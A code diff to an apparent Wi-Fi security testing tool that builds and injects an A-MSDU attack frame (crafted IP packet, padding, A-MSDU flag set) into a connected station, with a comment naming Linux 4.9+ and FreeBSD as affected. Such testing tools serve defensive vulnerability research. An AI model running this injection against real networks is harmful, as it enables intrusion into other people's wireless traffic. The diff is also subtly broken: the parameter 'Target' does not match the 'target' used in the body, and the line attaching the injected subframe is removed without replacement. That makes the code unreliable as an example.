@@ -1,15 +1,18 @@
 from fraginternals import *
 
-class AmsduAttack(Test):
+class AmsduInject(Test):
 	"""
 	Inject a frame identical to the one the station would receive when performing
 	the A-MSDU attack by injecting an IP packet with a specific identification field.
 	"""
 
-	def __init__(self, ptype, linux=False):
+	def __init__(self, ptype, Target=False):
 		super().__init__([Action(Action.Connected, Action.Inject, enc=True)])
 		self.ptype = ptype
-		self.linux = linux
+		self.target = target
+		if not self.target in [None, "linux"]:
+			log(ERROR, f"Unknown target {self.target} in A-MSDU injection test!")
+			quit(1)
 
 	def prepare(self, station):
 		log(STATUS, "Generating A-MSDU attack test frame", color="green")
@@ -26,11 +29,13 @@ class AmsduAttack(Test):
 			src = station.bss
 
 		# Put the request inside an IP packet
-		if not self.linux:
+		if self.target == None:
 			p = header/LLC()/SNAP()/IP(dst="192.168.1.2", src="1.2.3.4", id=34)/TCP()
-		else:
-			p = header/LLC()/SNAP()/IP(dst="192.168.1.2", src="3.5.1.1")/Raw(b"A" * 768)
-		p = p/create_msdu_subframe(src, dst, request, last=True)
+
+		# This works against linux 4.9 and above and against FreeBSD
+		elif self.target == "linux":
+			p = header/LLC()/SNAP()/IP(dst="192.168.1.2", src="3.5.1.1")/TCP()/Raw(b"A" * 748)
+
 		p[Dot11QoS].Reserved = 1
 
 		# Schedule transmission of frame
